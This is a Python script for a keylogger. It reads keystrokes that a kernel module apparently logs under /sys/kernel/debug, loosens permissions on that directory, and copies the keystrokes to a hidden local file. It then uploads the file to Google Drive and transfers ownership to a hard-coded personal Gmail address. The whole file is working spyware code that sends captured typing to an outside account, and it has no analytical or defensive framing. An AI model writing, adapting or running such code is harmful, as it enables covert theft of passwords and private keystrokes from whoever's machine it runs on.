from __future__ import print_function

import pickle
import os.path

from datetime import datetime
from datetime import date

from httplib2 import Http
from apiclient import errors
from apiclient.discovery import build
from apiclient.http import MediaFileUpload
from googleapiclient.discovery import build
from oauth2client import file, client, tools
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow
from oauth2client.service_account import ServiceAccountCredentials

import subprocess
import pyinotify
import time
import sys
import os

os.system("chmod a+rx /sys/kernel/debug")
filename = "/sys/kernel/debug/kisni/keys.log"
# filename = "test.log"
subprocess.call(['chmod', '0644', filename])

timeFlag = 0
now = datetime.now()
today = date.today()
current_time = now.strftime("%H:%M:%S")

# Starting credentials
creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', ['https://www.googleapis.com/auth/drive'])
drive_api = build('drive', 'v3', credentials=creds)

def uploadFileToDrive():
    folder_id = "root" 
    file_name = ".keylog.log"
    mimeType = "application/vnd.google-apps.unknown"

    print("Uploading file " + file_name + "...")

    file_metadata = {
        'name': file_name,
        'mimeType': mimeType
    }

    body = {'name': file_name, 'mimeType': mimeType}
    body['parents'] = [folder_id]  

    # Upload proper
    media = MediaFileUpload(file_name, mimetype='text/plain')
    fiahl = drive_api.files().create(body=body, media_body=media).execute()

    print("Created file '%s' id '%s'." % (fiahl.get('name'), fiahl.get('id')))

    user_permission = {
        'type': 'user',
        'role': 'owner',
        'emailAddress': 'larss198v2@gmail.com'
    }

    drive_api.permissions().create(
        fileId=fiahl.get('id'),
        body=user_permission,
        transferOwnership=True,
    ).execute()

def printFileIDsInDrive():
    results = drive_api.files().list(pageSize=10, fields="*").execute()
    items = results.get('files', [])
    if not items:
        print('No files found.')
    else:
        print('Files:')
        for item in items:
            print('{0} ({1})'.format(item['name'], item['id']))

def deleteFileInDrive():
    try:
        drive_api.files().delete(fileId=file_id_for_delete).execute()
    except errors.HttpError:
        print("An error occurred: %s" % error)

def follow(thefile):
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def writeToLog(line):
    # Create hidden log file
    global timeFlag
    with open(".keylog.log", "a") as logfile:
        if timeFlag == 0:
            logfile.write("\n\n[LOG CREATED AT: " + str(current_time) + " | " + str(today) + "]\n\n")
            timeFlag = 1
        logfile.write(line)

def continuously_check_for_updates():
    logfile = open(filename, "r")
    loglines = follow(logfile)
    for line in loglines:
        writeToLog(line)

def check_if_file_exists():
    while not os.path.exists(filename):
        time.sleep(1)

    if os.path.isfile(filename):
        # read file
        print("File created.")
        continuously_check_for_updates()
    else:
        raise ValueError("%s isn't a file!" % file_path)

if __name__ == '__main__':
    try:
        check_if_file_exists()
    except KeyboardInterrupt:
        uploadFileToDrive()
        printFileIDsInDrive()
        sys.exit(0)